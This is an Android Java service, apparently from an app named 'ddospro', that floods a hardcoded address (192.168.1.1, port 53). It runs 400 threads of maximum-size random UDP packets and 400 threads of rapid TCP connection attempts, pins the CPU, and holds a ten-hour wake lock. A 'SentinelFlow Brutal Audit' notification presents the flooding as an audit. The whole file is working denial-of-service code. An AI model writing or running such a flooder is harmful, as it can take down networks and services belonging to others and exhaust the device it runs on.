package com.mzkyzak.ddospro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

public class NetworkStressService extends Service {
    public static final AtomicLong packetCount = new AtomicLong(0);
    public static final AtomicLong packetPerSecond = new AtomicLong(0);
    private volatile boolean isRunning = true;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private ExecutorService threadPool;
    private PowerManager.WakeLock wakeLock;

    private final String TARGET_IP = "192.168.1.1";
    private final int TARGET_PORT = 53;

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK | 
            PowerManager.ACQUIRE_CAUSES_WAKEUP | 
            PowerManager.ON_AFTER_RELEASE, 
            "Sentinel:BrutalStress"
        );
        wakeLock.acquire(10 * 60 * 60 * 1000L); // 10 Hours
        threadPool = Executors.newFixedThreadPool(1000); 
        showNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        packetCount.set(0);
        packetPerSecond.set(0);
        Random random = new Random();

        // 1. UDP SATURATION (400 Threads - 65KB)
        for (int i = 0; i < 400; i++) {
            threadPool.execute(() -> {
                try (DatagramSocket socket = new DatagramSocket()) {
                    InetAddress ip = InetAddress.getByName(TARGET_IP);
                    byte[] data = new byte[65507];
                    while (isRunning) {
                        random.nextBytes(data);
                        socket.send(new DatagramPacket(data, data.length, ip, TARGET_PORT));
                        packetCount.incrementAndGet();
                    }
                } catch (Exception ignored) {}
            });
        }

        // 2. TCP SYN SATURATION (400 Threads)
        for (int i = 0; i < 400; i++) {
            threadPool.execute(() -> {
                while (isRunning) {
                    try (Socket socket = new Socket()) {
                        socket.connect(new InetSocketAddress(TARGET_IP, TARGET_PORT), 10);
                        packetCount.incrementAndGet();
                    } catch (Exception ignored) {}
                }
            });
        }

        // 3. CPU SATURATION (8x Core Stress)
        int cores = Runtime.getRuntime().availableProcessors();
        for (int i = 0; i < cores * 8; i++) {
            threadPool.execute(() -> {
                while (isRunning) {
                    double x = Math.tan(random.nextDouble()) * Math.atan(random.nextDouble());
                }
            });
        }

        handler.postDelayed(new Runnable() {
            private long lastCount = 0;
            @Override
            public void run() {
                if (!isRunning) return;
                long current = packetCount.get();
                packetPerSecond.set(current - lastCount);
                lastCount = current;
                handler.postDelayed(this, 1000);
            }
        }, 1000);

        return START_STICKY;
    }

    private void showNotification() {
        String cid = "brutal_stress_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(cid, "SentinelFlow Audit", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }

        Notification n = new NotificationCompat.Builder(this, cid)
            .setContentTitle("🔥 SentinelFlow Brutal Audit")
            .setContentText("Hardware saturation at 100% capacity")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setOngoing(true)
            .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(5, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(5, n);
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (threadPool != null) threadPool.shutdownNow();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}